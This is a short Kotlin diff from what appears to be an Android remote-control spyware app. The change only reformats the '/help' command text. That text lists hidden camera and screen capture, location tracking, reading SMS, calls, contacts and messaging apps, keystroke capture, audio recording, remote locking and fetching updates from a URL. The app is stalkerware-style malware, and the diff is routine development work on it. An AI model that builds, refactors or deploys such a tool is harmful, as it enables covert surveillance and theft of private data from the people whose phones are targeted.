@@ -341,8 +341,37 @@ cmd == "/keys" -> {
             }
             cmd == "/version" -> sendMsg("📱 Version: 1.0\nPackage: $packageName")
             cmd == "/help" -> sendMsg(
-    "📋 Commands:\n\n📷 /cam /selfie\n🔴 /livecam [sec] /liveselfie [sec]\n⏹ /stop\n📸 /screen /livescreen [sec]\n📍 /location\n🔋 /battery\n💬 /sms /calls /gallery\n📊 /usage\n🔔 /notifications\n👥 /contacts\n🔒 /lock /lockscreen [msg]\n📈 /daily\n💬 /whatsapp /fb /imo\n🎙 /record [sec]\n🚫 /block [app]\n✅ /unblock [app]\n📋 /blocked\n🗑 /unblockall\n📸 /autoshot on/off\n📍 /livetrack on/off\n⌨️ /keys\n🗑 /clearmsgs\n🔆 /flash\n📳 /vibrate\n💬 /toast [msg]\n🔄 /update [url]\n📱 /version\n🏓 /ping")
-
+    "📋 Commands:\n\n" +
+    "📷 /cam /selfie\n" +
+    "🔴 /livecam [sec] /liveselfie [sec]\n" +
+    "⏹ /stop\n" +
+    "📸 /screen /livescreen [sec]\n" +
+    "📍 /location\n" +
+    "🔋 /battery\n" +
+    "💬 /sms /calls /gallery\n" +
+    "📊 /usage\n" +
+    "🔔 /notifications\n" +
+    "👥 /contacts\n" +
+    "🔒 /lock /lockscreen [msg]\n" +
+    "📈 /daily\n" +
+    "💬 /whatsapp /fb /imo\n" +
+    "🎙 /record [sec]\n" +
+    "🚫 /block [app]\n" +
+    "✅ /unblock [app]\n" +
+    "📋 /blocked\n" +
+    "🗑 /unblockall\n" +
+    "📸 /autoshot on/off\n" +
+    "📍 /livetrack on/off\n" +
+    "⌨️ /keys\n" +
+    "🗑 /clearmsgs\n" +
+    "🔆 /flash\n" +
+    "📳 /vibrate\n" +
+    "💬 /toast [msg]\n" +
+    "🔄 /update [url]\n" +
+    "📱 /version\n" +
+    "🏓 /ping"
+)
+            
     // ===== App Usage Report =====
     private fun appUsage() {
         try {
